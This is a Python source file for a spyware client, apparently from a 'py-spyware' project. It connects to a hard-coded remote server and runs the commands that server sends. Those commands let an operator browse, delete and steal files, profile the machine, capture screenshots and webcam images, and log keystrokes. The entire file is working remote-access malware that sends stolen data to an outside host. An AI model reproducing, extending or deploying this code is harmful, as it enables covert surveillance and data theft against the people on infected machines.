import os
import shutil
import socket
import time
import platform
import psutil
import pyautogui
import io
from pynput import keyboard
import threading
import cv2

class App:
    def __init__(self):
        self.running = True
        self.hostname = "10.199.0.68" #server ip address
        self.port = 5554
        self.socket = None
        self.listener = None
        self.keys_log = []
          
    def run(self):
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.hostname, self.port))
                
                while self.running:
                    try:
                        msg_in = self.socket.recv(4096).decode()
                        header, msg, data = self.cmd_(msg_in)
                        self.socket.send(header.encode())
                        time.sleep(0.5)
                        if data != None:
                            self.socket.sendall(data)
                        else:
                            self.socket.send(msg.encode())
                        
                    except Exception as e:
                        print("Failed to received or send from server : ", e)
                        break
                self.socket.close()
                    
            except Exception as e:
                print("Failed to connect to server : ", e)
                time.sleep(1)

        
    def cmd_(self, input_):
        cmd = input_[0:input_.find(" ")]
        args = input_[input_.find(" ")+1:len(input_)]
        text = ""
        header = "TEXT"
        data = None
        
        if cmd in ["cd", "chdir", "goto"]:
            try:
                os.chdir(args)
            except Exception as e:
                text = str(e)
                
        elif cmd == "mkdir":
            try:
                os.mkdir(args)
                text = "successfully created" + args
            except Exception as e:
                text = str(e)
                
        elif input_ in ["ls", "dir", "listdir"]:
            try:
                text = "files and directories in" + str(os.getcwd()) + ":"
                text = str(os.listdir(os.getcwd()))
            except Exception as e:
                text = str(e)
                
        elif cmd in ["remove", "delete", "del", "rm"]:
            try:
                path = os.path.join(os.getcwd(), args)
                os.remove(path)
                text = "successfully deleted directory : " + str(args)
            except Exception as e:
                text = str(e)
                
        elif cmd in ["removedir", "deletedir", "rmdir"]:
            try:
                path = os.path.join(os.getcwd(), args)
                shutil.rmtree(path)
            except:
                try:
                    os.remove(args)
                except Exception as e:
                    text = str(e)
                    
        elif cmd in ["print", "cout", "write"]:
            try:
                print(args)
                text = "successfully printed : " + str(args)
            except Exception as e:
                text = str(e)
                
        elif cmd in ["sendfile", "send", "getfile"]:
            try:
                filepath = args.strip()
                with open(filepath, "rb") as f:
                    content = f.read()
                    header = f"FILE:{os.path.basename(filepath)}:{len(content)}"
                    data = content
            except Exception as e:
                text = "error while sending file" + str(e)
                
        elif cmd in ["zipfolder", "zip", "archive", "archivefolder"]:
            try:
                shutil.make_archive(args, "zip", os.getcwd()) #not sure if it works
                text = "successfully zipped/archived file : " + str(args)
            except Exception as e:
                text = "error while zipping/archiving folder : " + str(e)
            
        elif cmd in ["move", "movefolder", "movefile"]:
            try:
                from_ = args[0:args.find(" ")]
                to = args[args.find(" ")+1:len(args)]
                shutil.move(from_, to)
                text = "successfully moved folder/file : " + str(from_) + "| to : " + str(to)
            except Exception as e:
                text = "error while moving folder/file : " + str(e)
                
        elif input_ in ["getinfo", "info", "getpcinfo", "pcinfo"]:
            text = " OS : " + str(platform.system())
            text += "\n OS version : " + str(platform.version())
            text += "\n Architecture : " + str(platform.machine())
            text += "\n Processor : " + str(platform.processor())
                
            text += "\n CPU cores : " + str(psutil.cpu_count(logical=True))
            text += "\n CPU usage (%) : " + str(psutil.cpu_percent(interval=1))
            
            ram = psutil.virtual_memory()
            text += "\n RAM total : " + str(round(ram.total / (1024 * 1024), 2))
            text += "\n RAM used : " + str(round(ram.used / (1024 * 1024), 2))
            text += "\n RAM usage (%) : " + str(ram.percent)
        
            disk = psutil.disk_usage('/')
            text += "\n Disk total (GB) : " + str(round(disk.total / (1024 ** 3), 2))
            text += "\n Disk used (GB) : " + str(round(disk.used / (1024 ** 3), 2))
            text += "\n Disk usage (%) : " + str(disk.percent)
            
        elif input_ in ["screenshot", "screencapture", "takephoto"]:
            try:
                screenshot = pyautogui.screenshot()
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format="PNG")
                data = img_bytes.getvalue()
                
                header = f"IMG:{len(data)}"
            except Exception as e:
                text = "error while generating sceenshot : " + str(e)
                
        elif cmd in ["keylogger", "keyslistener"]:
            if args in ["ON", "on", "1", "true", "True"]:
                thread0 = threading.Thread(target=self.listen_keys)
                thread0.start()
            elif args in ["OFF", "off", "0", "false", "False"]:
                self.listener.stop()
            elif args in ["get", "read", "getkeys"]:
                text = "keys : " + "".join(self.keys_log)
                
        elif input_ in ["snapshot", "getwebcam", "webcamcapture", "webcamsnapshot"]:
            try:
                capture = cv2.VideoCapture(0)
                ret, frame = capture.read()
                capture.release()
                if ret:
                    _, buffer = cv2.imencode(".png", frame)
                    data = buffer.tobytes()
                    
                    header = f"IMG:{len(data)}"
                else:
                    text = "couldn't take a snapshot ..."
            except Exception as e:
                text = "error while taking snapshot : " + str(e)
            
            
    
        elif input_ in ["exit", "ex", "/exit"]:
            self.running = False
            
        elif input_ in ["", "help", "/?", "?"]:
            text = "commands : "
            text += "\n cd + path >>>to navigate to the desired directory"
            text += "\n mkdir + name >>>to create a new directory"
            text += "\n ls >>>to get all the directories and files in the current path"
            text += "\n remove + name >>>delete the file"
            text += "\n removedir + name >>>delete the directory"
            text += "\n for others commands see the readme at the github repository : "
            text += "\n https://github.com/mathishp33/py-spyware"
            text += "\n exit >>>exit program"
            
        else:
            text = "command not found. type help to get some"
            
        text += "\n current directory : " + str(os.getcwd())
        return header, text, data
            
    def on_press(self, key):
        try:
            self.keys_log.append(key.char)
        except:
            self.keys_log.append(f"[{key.name}]")
    
    def listen_keys(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
    

if __name__ == "__main__":
    app = App()
    app.run()
